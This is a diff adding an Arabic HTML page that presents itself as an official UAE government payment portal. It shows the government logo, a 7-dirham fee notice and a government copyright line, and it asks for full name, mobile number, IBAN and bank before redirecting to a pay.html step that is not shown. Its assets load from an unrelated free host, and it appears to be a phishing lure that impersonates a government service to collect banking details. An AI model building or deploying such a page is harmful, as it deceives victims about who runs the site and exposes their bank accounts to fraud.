@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>بوابة دفع قيمة الخدمات الإلكترونية</title>
+
+  <!-- Open Graph Meta Tags -->
+  <meta property="og:title" content="بوابة دفع قيمة الخدمات الإلكترونية">
+  <meta property="og:description" content="خدمة دفع إلكترونية موحدة — حكومة الإمارات العربية المتحدة (تجريبية)">
+  <meta property="og:type" content="website">
+  <meta property="og:url" content="https://example.netlify.app/">
+  <meta property="og:image" content="https://tonfree.serv00.net/sadUae/index-files/og-uae-1200x630.jpg">
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="بوابة دفع قيمة الخدمات الإلكترونية">
+  <meta name="twitter:description" content="خدمة دفع إلكترونية موحدة — حكومة الإمارات العربية المتحدة (تجريبية)">
+  <meta name="twitter:image" content="https://tonfree.serv00.net/sadUae/index-files/og-uae-1200x630.jpg">
+
+  <style>
+    body{font-family:Tahoma,Arial;background:#fff;margin:0}
+    header{text-align:center;padding:20px}
+    header img{height:80px}
+    main{padding:20px}
+    form{max-width:420px;margin:auto;background:#fff;padding:20px;border-radius:8px;box-shadow:0 0 8px rgba(0,0,0,.12)}
+    label{display:block;margin-top:14px;font-weight:700}
+    input,select,button{width:100%;padding:12px;margin-top:6px;border:1px solid #ccc;border-radius:6px;box-sizing:border-box}
+    button{background:#0b5320;color:#fff;border:0;font-weight:800;cursor:pointer}
+    button:hover{background:#094418}
+    footer{background:#000;color:#fff;padding:18px 20px;margin-top:30px;font-size:13px;text-align:center}
+  </style>
+</head>
+<body>
+  <header>
+    <img src="https://tonfree.serv00.net/sadUae/index-files/government-ae-logo-arabic.png" alt="شعار الإمارات">
+    <div style="color:red;font-weight:bold">قيمة هذه العملية: 7 دراهم</div>
+    <h2>بوابة دفع قيمة الخدمات الإلكترونية</h2>
+    <p>حكومة الإمارات العربية المتحدة</p>
+  </header>
+
+  <main>
+    <form id="mainForm">
+      <label for="fullName">الاسم بالكامل *</label>
+      <input id="fullName" required>
+      <label for="mobile">رقم الجوال *</label>
+      <input id="mobile" type="tel" placeholder="05XXXXXXXX" required>
+      <label for="iban">رقم الآيبان *</label>
+      <input id="iban" required>
+      <label for="bank">اختر البنك *</label>
+      <select id="bank" required>
+        <option value="">— اختر البنك —</option>
+        <option>بنك أبوظبي الأول</option>
+        <option>بنك دبي الإسلامي</option>
+      </select>
+      <label for="amount">المبلغ (درهم)</label>
+      <input id="amount" type="number" min="1" step="0.01" required>
+      <label for="invoice">رقم المفوتر</label>
+      <input id="invoice" maxlength="6" required>
+      <button type="submit">التالي</button>
+    </form>
+  </main>
+
+  <footer>© حكومة الإمارات 2025</footer>
+
+  <script>
+    document.getElementById('mainForm').addEventListener('submit', e => {
+      e.preventDefault();
+      window.location.href = 'pay.html';
+    });
+  </script>
+</body>
+</html>
